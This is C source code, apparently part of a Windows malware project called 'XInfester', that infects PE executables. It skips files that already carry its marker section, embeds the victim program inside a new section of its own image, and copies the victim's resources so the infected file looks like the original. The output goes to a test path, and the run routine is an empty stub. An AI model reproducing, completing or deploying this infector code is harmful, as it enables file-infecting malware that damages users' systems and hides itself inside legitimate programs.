#include "../inc/XInfester.h"

const char *GetLocalAppFilePath()
{
	static char FilePath[MAX_PATH+1]= {0};
	char *p = NULL;
	GetModuleFileName(NULL, FilePath, sizeof(FilePath)); //Get current application directory path
	
	if(p=strrchr(FilePath, '\\'))						                 
	*p='\0';
	
	return FilePath;
}

const char *GetLocalAppFilename()
{
	static char FileName[MAX_PATH+1]= {0};
	GetModuleFileName(NULL, FileName, sizeof(FileName)); //Get current application fullName
	return FileName;
}


const char *GetLocalAppInfestedFilename()
{
	static char FileName[MAX_PATH+1]= {0};
	char *p = NULL;
	GetModuleFileName(NULL, FileName, sizeof(FileName)); //Get current application fullName
	
	if(p=strrchr(FileName, '.'))						                 
	*p='\0';

	strcat(FileName,"_.exe");
	
	return FileName;
}



size_t GetfileSize(const char *FileName)
{
	FILE *pf;
	size_t Size;
	if (pf=fopen(FileName,"rb"))
	{
		fseek(pf,0,SEEK_END);
		Size=ftell(pf);
		fclose(pf);
		return Size;
	}
	
	return 0;  //Error;
}


DWORD vTemp_NewResRVAOffset;
PEStructure *vTemp_DestPE;

void ResourcesFixer(WORD *id,wchar_t *Name,DWORD length,DWORD *offsetToDataEnter,DWORD *size1,DWORD *DataRVA,void *Buffer)
{
	(*DataRVA)=vTemp_DestPE->RVA_To_FOA(*DataRVA)+vTemp_NewResRVAOffset;
}



BOOL XInfester_InfestFile( const char *pDestFileName )
{
	PEStructure __Dest,__Final;
	FILE *Destfp=NULL;

	size_t SelfFileSize;
	size_t DestFileSize;


	if (!(SelfFileSize=GetfileSize(GetLocalAppFilename())))
	{
		return FALSE;
	}

	if (!(DestFileSize=GetfileSize(pDestFileName)))
	{
		return FALSE;
	}

	//Checkout if the file has been infested.
	if (!__Dest.Load_PE_File(pDestFileName))
	{
		goto _ERR;
	}
	for (int i=0;i<__Dest.GetSectionCount();i++)
	{
		if (strcmp(__Dest.GetSectionName(i),XINFESTED_SECTION_STRING)==0)
		{
			__Dest.free();
			return TRUE;
		}
	}
	

	if(!__Final.Load_PE_File(GetLocalAppFilename()))
		goto _ERR;

	
	//Copy destPE resource section
	DWORD newResourceRVA;

	if(!__Final.AddSection
		(
		__Final.GetSectionCharacter(__Final.GetResourceDirctorySectionIndex()),
		(char *)__Final.GetSectionName(__Final.GetResourceDirctorySectionIndex()),
		__Dest.GetDirectorySize(2),
		newResourceRVA,
		__Dest.GetDirectoryDataBufferPointer(2)
		)
		)
	{
		goto _ERR;
	}

	DWORD HostRVA;
	//Copy host file to section
	if (!__Final.AddSection
		(
		__Final.GetSectionCharacter(__Final.GetResourceDirctorySectionIndex()),
		XINFESTED_SECTION_STRING,
		__Dest.GetImageSize(),
		HostRVA,
		__Dest.ImagePointer(0)
		)
	)
	{
		goto _ERR;
	}

	//Redirect resource section
	__Final.GetImageDirectory(2)->VirtualAddress=newResourceRVA;
	__Final.GetImageDirectory(2)->Size=__Dest.GetDirectorySize(2);

	//
	vTemp_NewResRVAOffset=HostRVA;
	vTemp_DestPE=&__Dest;
	__Final.EnumImageResourceData(__Final.GetImageRootResourceDirectoryPointer(),ResourcesFixer);


	__Final.Dump("E:\\test.exe");
	//Files open
	__Dest.free();
	__Final.free();
	return TRUE;
_ERR:
	__Dest.free();
	__Final.free();
	return FALSE;
}

void XInfester_Run()
{
	
}